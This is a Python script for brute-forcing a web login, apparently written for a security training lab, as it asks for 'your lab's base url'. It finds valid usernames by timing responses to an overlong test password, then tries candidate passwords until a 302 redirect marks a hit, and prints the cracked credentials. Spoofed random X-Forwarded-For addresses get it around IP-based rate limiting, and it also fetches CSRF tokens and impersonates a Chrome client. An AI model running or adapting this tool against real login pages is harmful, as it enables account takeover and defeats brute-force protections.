import os
import re
import time
import random
import ipaddress
import asyncio
from AutoConcurrencyScaler import AutoConcurrencyScaler
from curl_cffi.requests import AsyncSession
from urllib.parse import urljoin
from bs4 import BeautifulSoup

file_user = os.path.join(os.path.abspath(os.path.dirname(__file__)), "username_candidate.txt")
file_pass = os.path.join(os.path.abspath(os.path.dirname(__file__)), "password_candidate.txt")

test_username = "Test_Username"
test_password = "Test@P455w0rd".ljust(64,"a")

class BruteForce:
    def __init__(self, usernames: list[str], passwords: list[str]):
        self.usernames = usernames
        self.passwords = passwords
        self.scaler = AutoConcurrencyScaler(min_threads=5, max_threads=50, latency=2.0)
        self.queue = asyncio.Queue()
        self.active_tasks = 0
        self.lock = asyncio.Lock()
        self.valid_usernames = []
        self.pwned_creds = []
    
    def random_IP(self):
        target_network = [
            "192.168.1.0/24",
            "192.168.0.1/24",
            "14.160.0.0/11",
            "113.160.0.0/11",
            "118.68.0.0/14",
            "10.0.0.0/8",
            "172.0.0.0/16"
        ]
        cidr = random.choice(target_network)
        try:
            network = ipaddress.ip_network(cidr, strict=False)
            start = int(network.network_address) + 1
            end = int(network.broadcast_address) - 1
            if start > end:
                return str(network.network_address)
            rand = random.randint(start, end)
            return str(ipaddress.IPv4Address(rand))
        except ValueError:
            return "127.0.0.1"

    async def _get_csrf_token(self, session:AsyncSession):
        try:
            resp = await session.get(url=login_url)
            match = re.search(r'name=["\']csrf["\']\s+value=["\'](.*?)["\']', resp.text)
            if match:
                return match.group(1)
            raise Exception()
        except Exception:
            return None
    
    async def _check_username(self, session: AsyncSession, username:str):
        payload = {
            'username': username,
            'password': test_password
        }
        csrf_token = await self._get_csrf_token(session)
        if csrf_token: payload['csrf'] = csrf_token
        resp = await session.post(login_url, data=payload, headers={"X-Forwarded-For":self.random_IP()})
        if resp.elapsed.total_seconds()*1000 > 350:
            print (f"[+] Found User: {username} ({resp.elapsed.total_seconds()*1000} ms)")
            self.valid_usernames.append(username)
            print (f"[*] There is {len(self.passwords)} possible passwords")
            for pwd in self.passwords:
                self.queue.put_nowait( ('CRACK_PASS', username, pwd))
            return resp.status_code
        return resp.status_code


    async def _crack_password(self, session: AsyncSession, username:str, password:str):
        payload = {
            'username': username,
            'password': password
        }
        csrf_token = await self._get_csrf_token(session)
        if csrf_token: payload['csrf'] = csrf_token
        resp = await session.post(login_url, data=payload, headers={"X-Forwarded-For": self.random_IP()}, allow_redirects=False)
        if resp.status_code == 302:
            self.pwned_creds.append((username, password))
        return resp.status_code
    
    async def _worker_wrapped(self, session: AsyncSession, task_data):
        task_type = task_data[0]
        status_code = 0
        start_t = time.time()
        try:
            if task_type == 'CHECK_USER':
                username = task_data[1]
                status_code = await self._check_username(session, username)
            elif task_type == 'CRACK_PASS':
                _, username, password = task_data
                status_code = await self._crack_password(session, username, password)
        except Exception as e:
            status_code = 0
        finally:
            latency = time.time() - start_t
            self.scaler.update_result(status_code, latency)
            async with self.lock:
                self.active_tasks -= 1
    
    async def run(self):
        print (f"[*] Loading {len(self.usernames)} usernames...")
        for u in self.usernames:
            self.queue.put_nowait(('CHECK_USER', u))
        print (f"=== STARTING BRUTE FORCE ===")
        async with AsyncSession(impersonate="chrome142") as session:
            while not self.queue.empty() or self.active_tasks > 0:
                current_limit = self.scaler.limit
                async with self.lock:
                    can_spawn = self.active_tasks < current_limit
                if can_spawn and not self.queue.empty():
                    task_data = self.queue.get_nowait()
                    async with self.lock:
                        self.active_tasks += 1
                    asyncio.create_task(self._worker_wrapped(session, task_data))
                    task_type_str = "Usr" if task_data[0] == "CHECK_USER" else "Pwd"
                    print (f"\r[Speed: {self.active_tasks}/{current_limit}] Queue: {self.queue.qsize()} | Next: {task_type_str} ", end="")
                else:
                    await asyncio.sleep(0.05)
        print("\n\n[Done] Username::Password:")
        for pwned in self.pwned_creds:
            print(f"{pwned[0]}::{pwned[1]}")

if __name__ == "__main__":
    base_url = input("Enter your lab's base url: ")
    login_url = urljoin(base_url, "/login")
    # if sys.platform == "win32": asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    usernames = open(file_user, "r").read().splitlines()
    passwords = open(file_pass, "r").read().splitlines()
    bot = BruteForce(usernames, passwords)
    asyncio.run(bot.run())